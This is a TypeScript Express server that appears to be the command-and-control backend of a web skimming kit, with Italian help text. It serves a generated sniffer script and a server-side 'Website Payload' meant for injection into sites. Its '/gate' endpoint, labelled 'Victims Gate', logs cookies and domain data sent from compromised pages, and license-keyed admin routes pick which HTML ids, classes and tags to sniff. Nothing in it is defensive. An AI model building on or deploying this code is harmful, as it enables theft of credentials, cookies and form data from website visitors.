import * as http from "http";
import * as express from "express"
import * as bodyParser from "body-parser";
import * as cors from "cors";
import * as fs from "fs";
import {Generator} from "./modules/generator";
import {Logger} from "./modules/logger";
import {Loader} from "./modules/loader";
import {Locker} from "./modules/locker";
const app = express();
export class App {
  public conf:any;
  private logger:Logger;
  public locker:Locker;
  public generator:Generator;
  public loader:Loader;
  public eccipient: any;
  public expose: any;
  public detectedIp: any;
  public salty: String;
    constructor() {
        this.locker = new Locker();
        this.logger = new Logger();
        this.generator = new Generator();
        this.loader = new Loader();
        this.loader.bannerMessage();
        this.detectedIp = this.loader.findIp();
        app.use(cors())
        app.use(bodyParser.urlencoded({
            extended: false
        }));
         app.use(bodyParser.json());
        if (process.argv[2] === '-c' && process.argv[3] === 'config.json'){
            fs.readFile('./'+process.argv[3], "utf8", (err, jsonString) => {
              if (err) throw err;
                this.conf = JSON.parse(jsonString);
                console.log('[!] Instance User:'+this.conf.instanceUser);
                console.log('[!] License Key:'+this.conf.licenseKey);
                this.locker.verify(this.conf);
                if (!this.conf.randomName){
                  this.salty="Spear";
                } else {
                  this.salty= this.loader.randomString();
                }
                this.generator.populate(JSON.parse(jsonString),this.salty);
                this.eccipient = this.generator.init();
                this.expose = this.generator.endpoint();
                this.start(this.conf.port,this.detectedIp);
            });
          } else {
          this.logger.jsonError();
        }
    }
  private start(x:any,y:any): void {
        app.get('/'+this.salty,(req,res)=>{
          res.send(this.eccipient);
        });
        app.get('/'+this.conf.licenseKey+'/status',(req,res)=>{
          let commonids='';
          let commontags='';
          let commonclasses='';
          this.conf.documentids.forEach((id)=>{
            commonids +='\''+id+'\','
          });
          this.conf.documentclasses.forEach((id)=>{
            commonclasses +='\''+id+'\','
          });
          this.conf.documenttags.forEach((id)=>{
            commontags +='\''+id+'\','
          });
          res.send(`<style>
                               table {
                                 font-family: arial, sans-serif;
                                 border-collapse: collapse;
                                 width: 100%;
                               }
                               td, th {
                                 border: 1px solid #dddddd;
                                 text-align: left;
                                 padding: 8px;
                               }
                               tr:nth-child(even) {
                                 background-color: #dddddd;
                               }
                           </style>
                           <h2>STATUS Page</h2>
                           <table>
                           <tr>
                           <th>Parametri</th>
                           <th>Status</th>
                           </tr>
                           <tr>
                           <td>User</td>
                           <td>`+this.conf.instanceUser+`</td>
                           </tr>
                           <tr>
                           <td>Port</td>
                           <td>`+this.conf.port+`</td>
                           </tr>
                           <tr>
                           <td>Start Date</td>
                           <td>`+this.conf.initDate+`</td>
                           </tr>
                           <tr>
                           <td>End Date</td>
                           <td>`+this.conf.endDate+`</td>
                           </tr>
                           <tr>
                           <td>Timer Polling</td>
                           <td>`+this.conf.polling+`</td>
                           </tr>
                           <tr>
                           <td>Sniffer Core</td>
                           <td>`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</td>
                           </tr>
                           <tr>
                           <td>Victims Gate</td>
                           <td>`+this.detectedIp+':'+this.conf.port+'/gate'+`</td>
                           </tr>
                           <tr>
                           <td>HTML Ids</td>
                           <td>`+commonids.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>HTML Classes</td>
                           <td>`+commonclasses.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>Tags</td>
                           <td>`+commontags.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>Website Payload (Server-Side)</td>
                           <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
                           </tr>
                           </table>
                   `);
          res.end();
        });
        app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
          res.send(`<style>
                      table {
                        font-family: arial, sans-serif;
                        border-collapse: collapse;
                        width: 100%;
                      }
                      td, th {
                        border: 1px solid #dddddd;
                        text-align: left;
                        padding: 8px;
                      }
                      tr:nth-child(even) {
                        background-color: #dddddd;
                      }
                  </style>
                  <h2>HELP Page</h2>
                  <table>
                  <tr>
                  <th>Restapi Link</th>
                  <th>Descrizione</th>
                  </tr>
                  <tr>
                  <td>/licenseKey/help</td>
                  <td>Ritorna questa pagina</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/status</td>
                  <td>Visualizza una panoramica dei parametri</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/restart</td>
                  <td>Riavvia il server</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/add/nometag</td>
                  <td>Aggiunge un nuovo tag html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/add/nomeid</td>
                  <td>Aggiunge un nuovo id html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/add/nomeclasse</td>
                  <td>Aggiunge una nuova classe html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/remove/nometag</td>
                  <td>Rimuove un tag html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/remove/nomeid</td>
                  <td>Rimuove un id html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/remove/nomeclasse</td>
                  <td>Rimuove una classe html precedentemente impostata</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/polling/modify/num</td>
                  <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/history/list</td>
                  <td>Ritorna uno storico riguardante le operazioni di sniff sui vari siti a cui è collegato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/history/clear</td>
                  <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
                  </tr>
                  </table>`);
        res.end();
        });
        app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
	           process.exit(1);
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/tags/remove/:tagname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/ids/add/:idsname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/ids/remove/:idsname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/classes/add/:classname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/classes/remove/:classname',(req,res)=>{
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
             res.end();
        });

        app.post('/gate',(req,res)=>{
          if (req.body.domain === null && req.body.cookie === null){
            this.logger.alertMessage(req);
          } else {
            this.logger.writeLogs(req.body);
          }
            res.status(200);
            res.end();
         });
        const web = http.createServer(app);
        web.listen(x,y , () => {
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Server Status ON with '+`PID: ${process.pid}`));
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Rest-API on: '+this.detectedIp+':'+this.conf.port+'/gate'));
        });
    }
}
export default new App();
